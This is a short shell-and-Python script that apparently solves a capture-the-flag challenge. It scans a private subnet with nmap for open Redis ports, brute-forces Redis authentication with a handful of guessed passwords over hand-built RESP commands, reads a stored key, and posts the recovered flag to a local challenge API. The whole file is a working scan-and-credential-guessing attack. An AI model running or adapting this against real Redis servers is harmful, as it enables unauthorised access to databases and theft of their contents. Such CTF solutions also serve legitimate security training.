#!/bin/sh
set -eu
python3 - <<'PY'
import json
import re
import socket
import subprocess
import sys

challenge_id = "scl-challenge-frame-a79f04"
scan = subprocess.run(
    ["nmap", "-n", "-p", "6379", "--open", "-oG", "-", "172.20.0.0/24"],
    check=True, capture_output=True, text=True,
)
hosts = re.findall(r"Host: ([0-9.]+) .*Ports: 6379/open/", scan.stdout)
candidates = ["scoreboard", "admin", "ctf", "password", "redis", "neonladder"]


def command(*parts):
    encoded = [str(part).encode() for part in parts]
    return b"*%d\r\n" % len(encoded) + b"".join(
        b"$%d\r\n%s\r\n" % (len(part), part) for part in encoded
    )


def read_line(stream):
    line = stream.readline()
    if not line:
        raise ConnectionError("Redis closed the connection")
    return line.rstrip(b"\r\n")


flag = None
for host in hosts:
    for password in candidates:
        try:
            with socket.create_connection((host, 6379), timeout=2) as sock:
                stream = sock.makefile("rwb", buffering=0)
                stream.write(command("AUTH", password))
                if not read_line(stream).startswith(b"+OK"):
                    continue
                stream.write(command("GET", "arena:final"))
                header = read_line(stream)
                if not header.startswith(b"$"):
                    continue
                size = int(header[1:])
                if size < 0:
                    continue
                value = stream.read(size)
                stream.read(2)
                if value:
                    flag = value.decode()
                    break
        except (OSError, ValueError, ConnectionError):
            continue
    if flag:
        break

if not flag:
    sys.exit("Could not recover the scoreboard flag")
payload = json.dumps({"challenge_id": challenge_id, "task_id": "task1", "flag": flag})
subprocess.run([
    "curl", "-s", "http://172.20.0.3/api/challenges/submit", "-X", "POST",
    "-H", "Content-Type: application/json", "--data-binary", payload,
], check=True)
PY
